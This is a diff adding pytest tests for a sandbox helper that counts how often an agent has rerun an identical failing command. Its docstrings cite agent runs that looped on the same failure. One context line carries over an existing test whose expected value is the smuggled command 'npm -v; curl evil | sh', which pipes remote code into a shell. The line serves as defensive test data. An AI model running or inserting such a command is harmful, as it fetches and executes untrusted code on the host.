@@ -634,3 +634,56 @@ def test_a_string_command_survives_the_doubled_directory_repair() -> None:
 
     assert command == "npm -v; curl evil | sh"
     assert note is None
+
+
+# --- a command that has already failed this way --------------------------
+
+
+def test_a_command_that_already_failed_is_told_so(tmp_path) -> None:
+    """Measured twice.
+
+    run-9ff00d5b's `specialist_backend_2` wrote a `verify.js`, hit
+    `node:fs:448 ... binding.readFileUtf8` on a path that does not exist, and
+    ran the identical command four times with the identical failure.
+    run-e9e7f48f's `specialist_ui_ux_2` made 14 identical `grep` calls and rode
+    the stage into the recursion limit, failing the whole run.
+
+    Nothing told either of them.
+    """
+    from app.tools.sandbox import _record_execution, failed_this_way_before
+
+    command = ["node", "todo-app/verify.js"]
+    assert failed_this_way_before(str(tmp_path), command) == 0
+
+    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})
+    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})
+
+    assert failed_this_way_before(str(tmp_path), command) == 2
+
+
+def test_a_command_that_succeeded_is_not_counted(tmp_path) -> None:
+    """Re-running something that worked is ordinary."""
+    from app.tools.sandbox import _record_execution, failed_this_way_before
+
+    command = ["npm", "test"]
+    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})
+    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})
+
+    assert failed_this_way_before(str(tmp_path), command) == 0
+
+
+def test_a_different_command_is_not_counted(tmp_path) -> None:
+    """The point is that nothing changed. A changed command is the fix."""
+    from app.tools.sandbox import _record_execution, failed_this_way_before
+
+    _record_execution(str(tmp_path), "r", ["node", "a.js"], {"returncode": 1})
+
+    assert failed_this_way_before(str(tmp_path), ["node", "b.js"]) == 0
+    assert failed_this_way_before(str(tmp_path), ["node", "a.js"]) == 1
+
+
+def test_an_unwritable_ledger_never_fails_the_command() -> None:
+    """A hint must not be able to break the thing it is hinting about."""
+    from app.tools.sandbox import failed_this_way_before
+
+    assert failed_this_way_before("/definitely/not/here", ["node", "a.js"]) == 0
